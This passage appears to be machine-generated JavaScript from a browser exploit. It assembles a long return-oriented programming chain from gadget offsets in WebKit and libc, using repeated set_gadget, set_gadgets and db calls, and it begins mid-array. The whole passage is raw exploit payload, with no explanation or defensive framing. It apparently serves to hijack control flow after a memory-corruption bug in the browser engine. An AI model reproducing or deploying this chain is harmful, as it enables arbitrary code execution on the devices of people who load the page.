]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([448, 0]); 
set_gadget(libc_base+788575,); 
db([448, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+322368, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+322384, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+322352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+322480, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+399704, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+322600, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+322760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+322728, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+322744, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+322840, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662384, 0]); 
set_gadget(libc_base+788575,); 
db([662384, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+322992, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+323008, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+322976, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+323104, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+398560, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+323224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+323384, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+323352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323368, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+323464, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662384, 0]); 
set_gadget(libc_base+788575,); 
db([662384, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+323616, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+323632, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+323600, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+323728, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+399616, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+323848, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+324008, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+323976, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+323992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+324088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([662393, 0]); 
set_gadget(libc_base+788575,); 
db([662393, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+324240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+324256, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+324224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+324352, 
webkit_base+7438103, 
libc_base+788575, 
ropchain+398592, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+50775, 
libc_base+793877, 
ropchain+324424, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+324624, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+324712, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967260, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+50775, 
libc_base+793877, 
ropchain+324792, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+324992, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+325080, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967256, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+325208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+325376, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+325408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+325360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325392, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+325504, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+325488, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([8, 0]); 
set_gadget(libc_base+792472,); 
db([8, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1506828, 
libc_base+793877, 
ropchain+325720, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+325736, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+325704, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+325848, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+325816, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399064, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965204, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+325960, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965200, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326072, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965196, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326184, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+793877, 
ropchain+326240, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+326304, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965196, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+326392, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+326408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+326560, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+326592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+326544, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+326576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+326664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+326680, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+326776, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+326760, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+326856, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([512, 0]); 
set_gadget(libc_base+788575,); 
db([512, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+327008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+326992, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+327192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+327312, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327360, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+327344, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+327472, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+327464, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+327488, 
ropchain+327504, 
libc_base+811575, 
ropchain+327520, 
libc_base+811575, 
ropchain+330792, 
libc_base+793877, 
ropchain+327576, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965204, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+327664, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+327832, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+327864, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+327816, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+327848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+327960, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+327944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+328208, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+391184, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+328344, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+328360, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+328328, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+328456, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+328440, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+328552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+328632, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+328688, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+328784, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965196, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+328872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+328888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+329040, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329072, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+329024, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+329056, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+329232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+329200, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+329184, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+329304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329320, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+329408, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+329464, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+329536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+329592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+329696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329712, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+329864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+329880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+329848, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+330000, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+329984, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965204, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+330064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+330128, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965196, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330216, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330232, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+330384, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+330416, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+330368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330400, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+330512, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+330496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+330600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330672, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965196, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+330736, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+326248, 
libc_base+793877, 
ropchain+330848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965200, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+330936, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+330952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+331104, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+331136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+331088, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331120, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+331232, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+331216, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+331328, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965204, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+331416, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+331584, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+331616, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+331568, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+331600, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+331712, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+331696, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397968, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+331864, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+793877, 
ropchain+331976, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+332048, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
